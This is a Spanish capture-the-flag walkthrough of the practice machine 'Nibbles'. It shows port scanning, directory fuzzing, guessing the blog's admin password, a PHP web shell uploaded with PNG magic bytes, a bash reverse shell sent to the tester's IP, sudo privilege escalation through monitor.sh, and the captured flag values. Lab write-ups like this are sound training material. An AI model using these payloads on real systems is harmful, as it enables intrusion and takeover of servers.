
![[ 20250711111355.png]](nibbles-images/20250711111355.png)

# Nmap

hacemos un escaneo basico de puertos en nmap

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.96.84 -oN scanner
```

![[ 20250711113527.png]](nibbles-images/20250711113527.png)

una vez identificados los puertos hacemos un escaneo con scripts para ver servicios y versiones 

```bash
nmap -p22,80 -sCV 10.129.96.84 -oN targeted
```

![[ 20250711113803.png]](nibbles-images/20250711113803.png)

# Puerto 80

![[ 20250711113852.png]](nibbles-images/20250711113852.png)

entramos en la web y vemos un cartel de "hola mundo"

## Burpsuite

Utilizamos burpsuite para hacer un escaneo de la pagina web 

![[ 20250711113948.png]](nibbles-images/20250711113948.png)

vemos que hay un directorio llamado nibbleblog que contiene varias cosas
![[ 20250711114019.png]](nibbles-images/20250711114019.png)

## WFUZZ 

utilizamos wfuzz en terminal para ver todo lo que contiene ese directorio por si aparecieran archivos o directorios interesantes

```bash
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://10.129.96.84/nibbleblog/FUZZ
```
![[ 20250711114144.png]](nibbles-images/20250711114144.png)

vemos cositas interesantes
- admin.php
- content
- plugins
- readme

vamos a investigar un poco sobre todo esto

### Admin.php 

![[ 20250711114245.png]](nibbles-images/20250711114245.png)

vemos un panel de login pero desconocemos las credenciales, probe a hacer un ataque diccionario pero se activa una black list por lo que no podemos realizar fuerza bruta contra el panel, debemos encontrar credenciales en otra parte

### content

buscamos en el directorio de contenido a ver que encontramos

![[ 20250711114416.png]](nibbles-images/20250711114416.png)

accedemos a la parte privada del contenido donde suponemos que estara lo mas interesante


![[ 20250711114501.png]](nibbles-images/20250711114501.png)

encontramos config.xml, la carpeta de plugins y users.xml

#### users.xml

![[ 20250711114553.png]](nibbles-images/20250711114553.png)

entendemos que el usuario es admin

#### config.xml

![[ 20250711114633.png]](nibbles-images/20250711114633.png)

aqui vemos el nombre nibbles y el correo admin@nibbles.com

tratemos de entrar en la pagina de login con credenciales admin:nibbles

![[ 20250711114742.png]](nibbles-images/20250711114742.png)

Como no se ve la contraseña voy a modificar el codigo html para que el writeup sea fiable y comprobemos todos que realmente funciona

![[ 20250711114930.png]](nibbles-images/20250711114930.png)

![[ 20250711114948.png]](nibbles-images/20250711114948.png)

confirmamos que la contraseña es nibbles

y tenemos un panel de control de administrador

# Reverse shell

tratemos de conseguir una shell, accedemos a la carpeta plugins y vamos a instalar un nuevo plugin

![[ 20250711115134.png]](nibbles-images/20250711115134.png)

Decido instalar about por que me permite cargar una imagen que trataremos de envenenar

![[ 20250711115232.png]](nibbles-images/20250711115232.png)

creamos un archivo .php en nuestro equipo con los magic numbers de png 

```bash
echo '89 50 4E 0D 0A 1A 0A' |xxd -p -r > fatality.php 
```

luego con nano modificamos el php para inyectarle lo siguiente 

```php
<?php system($_GET['cmd']); ?>
```


![[ 20250711115330.png]](nibbles-images/20250711115330.png)

una vez tenemos esto vamos a subirlo a la pagina web

![[ 20250711115611.png]](nibbles-images/20250711115611.png)

al subir el archivo vemos un montón de errores y una ventanita que confirma los cambios realizados

volvemos al directorio http://10.129.96.84/nibbleblog/content/private/plugins/

![[ 20250711115722.png]](nibbles-images/20250711115722.png)

![[ 20250711115737.png]](nibbles-images/20250711115737.png)

vemos que se ha creado el archivo profile_picture.php

![[ 20250711115806.png]](nibbles-images/20250711115806.png)

probamos una inyección en este archivo php

![[ 20250711115843.png]](nibbles-images/20250711115843.png)

vemos que devuelve el id por lo que tenemos web shell

vamos a mandarnos la shell a nuestro equipo para trabajar mejor

```bash
10.129.96.84/nibbleblog/content/private/plugins/about/profile_picture.php?cmd=bash -c "bash -i %26> /dev/tcp/10.10.14.35/443 0>%261" 
```

nos ponemos en escucha en el puerto seleccionado 443

```bash
nc -nlvp 443
```

![[ 20250711120612.png]](nibbles-images/20250711120612.png)

![[ 20250711120626.png]](nibbles-images/20250711120626.png)

## Tratamos la shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`Ctrl + Z`

```bash
stty raw -echo; fg
```

```bash
export TERM=xterm
```

una vez dentro de la shell 

```bash
stty rows 40 columns 140
```

# Escalada de privilegios

ahora mismo somos usuario nibbler

![[ 20250711121003.png]](nibbles-images/20250711121003.png)

en el directorio personal de nibbler vemos la flag y un .zip

vemos si podemos ejecutar algo sin contraseña 

```bash
sudo -l
```

![[ 20250711121102.png]](nibbles-images/20250711121102.png)

vemos que podemos ejecutar el programa monitor.sh como root, pero tenemos que descomprimir el zip

```bash
unzip personal.zip
```

![[ 20250711121215.png]](nibbles-images/20250711121215.png)

abrimos el programa .sh para ver que hace

![[ 20250711121300.png]](nibbles-images/20250711121300.png)

modificamos el codigo ya que tenemos permiso de ejecución como root tratamos de lanzar una shell 

lo primero damos permisos de ejecucion al programa

```bash
chmod +x monitor.sh
```

![[ 20250711121428.png]](nibbles-images/20250711121428.png)

ejecutamos el programa con sudo

```bash
sudo ./monitor.sh
```

![[ 20250711121651.png]](nibbles-images/20250711121651.png)

# Flags

## Nibbler
en el directorio /home/nibbler tenemos la flag user.txt
user : 10d950ad1cab4790a644a7619ca98ff7

## root

en el directorio /root tenemos la flag root.txt

root : 10128c6540d3e6f06654eb3feb0be917
